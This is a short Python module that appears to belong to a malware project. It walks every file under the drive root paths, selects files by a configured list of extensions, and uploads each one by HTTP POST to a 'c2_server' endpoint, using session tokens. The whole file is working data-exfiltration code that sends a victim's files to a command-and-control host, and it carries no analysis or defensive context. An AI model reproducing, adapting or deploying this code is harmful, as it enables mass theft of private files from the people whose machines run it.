import os
import requests
from System.Driver_Handling import root_paths
from Session.Token_Handling import token_check
from Core.Variables import extesions, c2_server, cert_path

def find_files_upload():
    root_path = root_paths()
    for root, _, files in os.walk(root_path):
        for file in files:
            if file.lower().endswith(tuple(extesions)):
                file_path_upload = os.path.join(root, file)
                print(file_path_upload)
                upload_file(file_path_upload)

def upload_file(file_path_upload):
    headers, renamed_key, unique_id, unique_uuid = token_check()

    try:
        with open(file_path_upload, "rb") as f:
            files = {"file": (os.path.basename(file_path_upload), f)}
            response = requests.post(c2_server + "/upload_file", files=files, headers=headers, verify = cert_path)
        
        if response.status_code == 200:
            print("File Uploaded")
        else:
            print(f"File Upload Failed Status Code: {response.status_code}")
    
    except Exception as e:
        print(f"Error sending file: {e}") # Debug Message